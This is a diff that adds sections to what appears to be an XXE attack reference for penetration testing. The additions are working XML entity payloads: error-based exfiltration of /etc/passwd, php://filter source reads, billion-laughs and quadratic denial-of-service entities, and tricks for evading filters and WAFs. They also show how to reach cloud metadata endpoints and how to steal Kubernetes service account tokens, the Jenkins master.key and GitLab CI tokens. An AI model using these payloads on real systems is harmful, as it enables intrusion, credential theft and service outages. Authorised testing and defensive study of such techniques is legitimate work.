@@ -111,6 +111,37 @@ Outer payload:
 %e; %exfil;
 ```
 
+### Error-based exfil
+Force the parser to fail on a path that interpolates the leaked file:
+```xml
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval; %error;
+```
+The error message echoes the file path — readable contents land in the
+exception output.
+
+### PHP filter base64
+Use `php://filter` to read binary or PHP source without breaking the XML:
+```xml
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+```
+Decode the base64 from the response.
+
+### DoS variants
+Billion laughs (exponential):
+```xml
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+```
+Quadratic blowup (single large entity, repeated reference) — bypasses
+some entity-count limits that block billion-laughs:
+```xml
+<!ENTITY a "aaaa...[50KB]...aaaa">
+<data>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</data>
+```
+
 ## Vulnerability classes
 
 ### Parameter entities
@@ -151,9 +182,28 @@ xml-stylesheet PI consumers.
   CDATA and comments to evade naive filters.
 - **DOCTYPE variants** — `PUBLIC` vs `SYSTEM`, mixed case `<!DoCtYpE>`,
   internal vs. external subsets, multi-DOCTYPE edge handling.
+- **URL-encoded paths** — `file:%2F%2F%2Fetc%2Fpasswd` slips past naive
+  `file://` string filters.
+- **CDATA-wrapped DTD** — bury the DOCTYPE inside `<![CDATA[ ... ]]>`
+  when a WAF strips literal `<!DOCTYPE` tokens; some upstream
+  preprocessors unwrap CDATA before the parser sees it.
+- **Namespace shimming** — declare `xmlns:xi="http://www.w3.org/2001/XInclude"`
+  inside an inner element to bypass DTD blocks while keeping XInclude.
+- **Content-Type swap** — flip `application/json` → `application/xml`
+  or `text/xml` on JSON endpoints; many frameworks auto-negotiate and
+  hand the body to an unhardened XML parser.
 - **Network controls** — if network blocked but filesystem readable,
   pivot to local file disclosure; if files blocked but network open,
   pivot to SSRF / OAST.
+
+### Cloud metadata header bypass
+IMDSv2 / Azure / GCP v2 require custom headers that classic XXE cannot
+set. Workarounds:
+- **Java `jar:` wrapper**: `jar:http://metadata.google.internal!/computeMetadata/v1/...`
+  — some Java parsers normalise headers differently.
+- **Open-redirect chain**: point the entity at a same-origin redirect
+  endpoint that 30x's to `169.254.169.254`, inheriting any required
+  headers from the redirector.
 
 ## Special contexts
 
@@ -180,6 +230,33 @@ xml-stylesheet PI consumers.
 - OOXML (`docx` / `xlsx` / `pptx`) are ZIPs containing XML.
 - Insert payloads into `document.xml`, `rels`, or drawing XML and
   repackage.
+
+### EPUB
+- EPUBs are ZIPs containing XML manifests. Target library / e-reader /
+  e-commerce upload paths.
+- Inject into `META-INF/container.xml` or `content.opf`, repackage, upload.
+
+### Apple plist / app-site-association
+- iOS deep-link configs are XML; XML-driven generators may resolve
+  entities when building `apple-app-site-association`.
+
+### SAML — request and assertion paths
+- **AuthnRequest**: inject DOCTYPE before `<saml:Issuer>` — the SP parses
+  it before signature checks.
+- **Encrypted assertion wrapping**: place the DTD outside the
+  `<EncryptedData>` block; the SP decrypts then parses, reaching your
+  external entity post-decrypt.
+
+### Kubernetes / CI-CD config parsers
+- **Admission webhooks** (Validating/Mutating): pod annotations or
+  ConfigMap data parsed as XML by a vulnerable webhook leak the service
+  account token at `/var/run/secrets/kubernetes.io/serviceaccount/token`.
+- **Jenkins**: `config.xml` job imports parse XML — read
+  `/var/jenkins_home/secrets/master.key`.
+- **GitLab CI**: JUnit `report.xml` artifacts are parsed by GitLab —
+  exfil runner config or job tokens.
+- **Maven / Gradle**: a poisoned `pom.xml` in a dependency triggers XXE
+  when the build server resolves it.
 
 ## Workflow
 
